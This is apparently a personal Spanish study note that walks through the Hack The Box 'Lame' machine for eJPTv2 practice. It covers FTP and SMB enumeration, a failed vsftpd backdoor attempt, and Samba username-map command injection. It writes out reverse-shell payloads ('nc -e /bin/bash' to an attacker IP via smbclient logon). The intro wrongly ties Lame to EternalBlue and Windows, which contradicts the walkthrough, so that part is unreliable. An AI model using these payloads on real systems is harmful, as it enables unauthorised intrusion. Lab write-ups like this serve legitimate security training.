- ---
- Tags: #ejptmachine #ftp #smbmap #smbclient #vsftpd
----
### ¿Qué habilidades puedes practicar con Lame?

1. **Reconocimiento y enumeración:**
    - **Nmap** es la herramienta clave para realizar un escaneo de puertos y descubrir servicios abiertos en la máquina.
    - Al ser una máquina fácil, se enfoca en vulnerabilidades comunes, por lo que aprenderás a identificar servicios típicos como **FTP**, **SMB**, o **SSH**.
2. **Explotación de vulnerabilidades comunes:**
    - **Lame** está centrada en una vulnerabilidad de **SMB** conocida como **EternalBlue**, que fue un exploit famoso utilizado en los ataques de WannaCry.
    - Este tipo de explotación es bastante básico y está alineado con lo que podrías enfrentar en la **eJPTv2**, ya que involucra servicios ampliamente utilizados y bien documentados.
3. **Escalada de privilegios:**
    - Una vez dentro, necesitarás escalar privilegios en un entorno **Windows**. Esto es un paso común en el proceso de un pentest y se cubre en la eJPTv2.
    - La escalada en **Lame** se hace mediante **números de versión** y permisos mal configurados en el sistema.

----

**nmap -sV -T5 -Pn 10.10.10.3**
![Pasted image 20241114193750](../../Fotos/Pasted%20image%2020241114193750.png)

Esta version del servisio vsftpd 2.3.4 es vulnerable a un backdoor y estamos revisando si con metasploit podemos generar una intrusión cosa que no logramos en este caso especifico.)

**msfconsole**
**use exploit/unix/ftp/vsftpd_234_backdoor**
**set RHOST <IP_DEL_OBJETIVO>**
**run**
![Pasted image 20241114193356](../../Fotos/Pasted%20image%2020241114193356.png)

----
*Generamos intento de intrusión anonymous el cual es exitoso*
![Pasted image 20241114194644](../../Fotos/Pasted%20image%2020241114194644.png)

![Pasted image 20241114194759](../../Fotos/Pasted%20image%2020241114194759.png)

No tenemos permisos de escritura y en general no podemos hacer mucho asique dejamos la intrusión ftp un momento de lado.

----
Como vemos que hay servicio samba haremos un reconocimiento
**smbmap -H 10.10.10.3 -u '' -p ''**
- u user 
- p password
- -H host victima
![Pasted image 20241114195119](../../Fotos/Pasted%20image%2020241114195119.png)

`smbclient \\\\10.10.10.3\\tmp -N`
- Como tenemos acceso de lectura y escritura al directorio tmp intentamos tener acceeso con smbclient
- N sesion nula, sin tener que meter credenciales
![Pasted image 20241114195309](../../Fotos/Pasted%20image%2020241114195309.png)
![Pasted image 20241114200248](../../Fotos/Pasted%20image%2020241114200248.png)
No nos reporta tan cosa asique tambien lo dejaremos de lado un momento.

----
**search exploit unix/remote/49757.py -m . **
- trae el exploit a nuestro directorio actual y asi podemos ver como funciona por detras
![Pasted image 20241114200543](../../Fotos/Pasted%20image%2020241114200543.png)

![Pasted image 20241114201102](../../Fotos/Pasted%20image%2020241114201102.png)
Recapitulamos, metasploit en este caso no va

----
exploit Samba 3.0.20-Debian
![Pasted image 20241114201502](../../Fotos/Pasted%20image%2020241114201502.png)

Revisamos el exploit y extraemos lo necesario para vulnerar la maquina.
![Pasted image 20241114201858](../../Fotos/Pasted%20image%2020241114201858.png)
Si nosotros colocamos la sintaxis de la imagen en el username nos permite ejecutar comandos y por ende podemos hacer una reverse shell

```bash
"/=`nohup " + buf + "`"
```
logon
![Pasted image 20241114201806](../../Fotos/Pasted%20image%2020241114201806.png)

![Pasted image 20241114202435](../../Fotos/Pasted%20image%2020241114202435.png)
- Esta ejecucion de comandos aparentemente se ejecuta pero no nos muetra la data del comando whoami por ejemplo sin embargo al parecer esta corriendo.

Intentamos directamente con la reverse shell para ello nos ponemos en escucha por algún puerto de elección por nuestra maquina atacante.
![Pasted image 20241114202356](../../Fotos/Pasted%20image%2020241114202356.png)

```bash
logon "/=`nohup nc -e /bin/bash 10.10.14.11 1234 `"
```

![Pasted image 20241114203021](../../Fotos/Pasted%20image%2020241114203021.png)

![Pasted image 20241114203036](../../Fotos/Pasted%20image%2020241114203036.png)

`Maquina Vulnerada`

*Tratamiento*

**script /dev/null -c bash**
![Pasted image 20241114203152](../../Fotos/Pasted%20image%2020241114203152.png)

**stty raw -echo;fg**
**export TERM=xterm**
**reset**
![Pasted image 20241114203416](../../Fotos/Pasted%20image%2020241114203416.png)

---
----
----
# Otra forma de hacer la maquina

**nmap -sC -sV -A -vvv -oN lame.txt 10.10.10.3**
**ftp 10.10.10.3**
- anonymous
**bye**
**crackmapexec smb 10.10.10.3 -u '' -p '' --shares**
o tambien
**smbclient -L 10.10.10.3 -N**
- Si nos salta un error usaremos: **smbclient -L 10.10.10.3 -N --options='client min protocol = NT1**
Vemos que tenemos posibilidad de leer y escribir solo en directorio tmp
![Pasted image 20241114223548](../../Fotos/Pasted%20image%2020241114223548.png)
Para conectarnos
**smbclient -L \\\\10.10.10.3\tmp -N**
- Si no sirve usamos: **smbclient -L ////10.10.10.3/tmp -N**
Tenemos acceso pero no hay nada reelevante
![Pasted image 20241114223921](../../Fotos/Pasted%20image%2020241114223921.png)

Cuando hacemos un escaneo con nmap y nos muestra versiones es importante tener en cuenta que algunas de estas pueden ser antiguas y presentar vulnerabilidades, plugins web etc.
![Pasted image 20241114224221](../../Fotos/Pasted%20image%2020241114224221.png)

*Inspeccion de exploit*
`unix/remote/16320.rb`
![Pasted image 20241114224336](../../Fotos/Pasted%20image%2020241114224336.png)
![Pasted image 20241114224404](../../Fotos/Pasted%20image%2020241114224404.png)

![Pasted image 20241114224413](../../Fotos/Pasted%20image%2020241114224413.png)

**smbclient -L \\\\10.10.10.3\tmp -N**
**logon**

*prueba de ping*
```bash
logon "/=`nohup nc -e ping -c 1 10.10.14.11 `"
```

En otra ventana nos ponemos en escucha
**tcpdump -i tun0 icmp**
- Interfaz de red en este caso la de htb

*reverse shell*
**nc -nvlp 443**
```bash
logon "/=`nohup nc -e /bin/bash 10.10.14.11 1234 `"
```

![Pasted image 20241114224920](../../Fotos/Pasted%20image%2020241114224920.png)

*Tratamiento*
![Pasted image 20241114224944](../../Fotos/Pasted%20image%2020241114224944.png)

---
---
---
# Preguntas HTB

Nos preguntan porque si en el escaneo de nmap muestra 4 puertos tcp abiertos si hacemos el comando netstat a la ip de la maquina victima muestra mas puertos abiertos en escucha lo cual no muestra nmap y por ende no son accesibles.
- La respuesta es que hay una restriccion a nivel de red lo cual podria ser reglas de firewall, grupos de seguridad, software de seguridad basados en el host, configuracion de router/red local o configuracion a nivel superior.
![Pasted image 20241114204826](../../Fotos/Pasted%20image%2020241114204826.png)

Puedes comprobar si hay reglas de firewall activas usando los siguientes comandos:

- Para `iptables`: `sudo iptables -L -v -n`
- Para `ufw`: `sudo ufw status verbose`

*En este caso efectivamente es por un sistema firewall*

----
Cuando se activa la puerta trasera VSFTPd, ¿qué puerto comienza a escuchar?
6200
